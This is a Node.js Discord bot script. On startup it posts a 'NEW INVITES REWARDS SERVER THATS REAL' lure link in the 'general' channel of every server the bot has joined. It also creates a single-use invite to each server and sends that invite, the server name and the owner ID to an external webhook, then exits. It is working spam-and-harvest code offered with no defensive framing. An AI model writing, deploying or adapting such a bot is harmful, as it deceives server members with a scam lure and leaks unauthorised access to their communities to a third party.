const { Client, GatewayIntentBits, WebhookClient } = require('discord.js');
const dotenv = require('dotenv');

dotenv.config();

const TOKEN = process.env.DISCORD_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

if (!TOKEN || !WEBHOOK_URL) {
    console.error("Error: DISCORD_TOKEN or WEBHOOK_URL not set in .env file.");
    process.exit(1);
}

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
const webhookClient = new WebhookClient({ url: WEBHOOK_URL });

async function sendMessageAndLog(guild) {
    const generalChannel = guild.channels.cache.find(channel => channel.name === 'general' && channel.type === 0); // 0 is text channel

    if (generalChannel) {
        try {
            await generalChannel.send("https://discord.gg/8Pbgpzxf NEW INVITES REWARDS SERVER THATS REAL");

            const ownerId = guild.ownerId;
            const invite = await guild.channels.cache.filter(c => c.type === 0).first().createInvite({ maxUses: 1, unique: true }); //Creates invite to first text channel
            const serverName = guild.name;

            const logMessage = `Server Name: ${serverName}\nOwner ID: ${ownerId}\nInvite: ${invite}`;

            await webhookClient.send({ content: logMessage });
        } catch (error) {
            if (error.code === 50001) { // Error code for missing permissions
                console.error(`Bot does not have permission to send messages in ${generalChannel.name} in ${guild.name}`);
            } else if (error.code === 10003){ //Error code for unknown channel
                console.error(`Could not find a text channel in ${guild.name} to create invite.`)
            }
            else {
                console.error(`Error sending message or creating invite in ${guild.name}: ${error}`);
            }
        }
    } else {
        console.error(`Could not find 'general' channel in ${guild.name}`);
    }
}

client.on('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);

    for (const guild of client.guilds.cache.values()) {
        await sendMessageAndLog(guild);
    }
    client.destroy(); //Closes the bot after execution
});

client.login(TOKEN);
